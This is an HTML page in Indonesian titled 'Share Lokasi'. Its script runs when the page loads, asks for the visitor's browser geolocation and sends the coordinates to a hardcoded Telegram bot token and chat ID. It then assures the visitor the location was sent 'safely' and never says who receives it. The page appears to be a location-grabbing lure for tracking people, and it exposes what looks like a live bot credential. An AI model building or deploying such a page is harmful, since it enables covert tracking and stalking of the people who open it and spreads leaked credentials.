<!DOCTYPE html>
<html>
<head>
  <title>Share Lokasi</title>
</head>
<body>
  <h2>Meminta Lokasi...</h2>
  <p id="status">Mengambil lokasi...</p>

  <script>
    function sendLocation(lat, lon) {
      const token = "7628065493:AAGuSA9aek-c_dtizC564vGl7nOFRe8TYko";
      const chatId = "5677912817";
      const url = `https://api.telegram.org/bot${token}/sendLocation?chat_id=${chatId}&latitude=${lat}&longitude=${lon}`;

      fetch(url)
        .then(response => {
          if (response.ok) {
            document.getElementById("status").innerText = "Lokasi kamu berhasil dikirim dengan aman.";
          } else {
            document.getElementById("status").innerText = "Gagal mengirim lokasi.";
          }
        })
        .catch(err => {
          document.getElementById("status").innerText = "Terjadi kesalahan: " + err;
        });
    }

    function getLocation() {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
          (position) => {
            sendLocation(position.coords.latitude, position.coords.longitude);
          },
          () => {
            document.getElementById("status").innerText = "Gagal mendapatkan lokasi. Mohon izinkan akses lokasi di browser kamu.";
          }
        );
      } else {
        document.getElementById("status").innerText = "Geolocation tidak didukung oleh browser ini.";
      }
    }

    getLocation();
  </script>
</body>
</html>
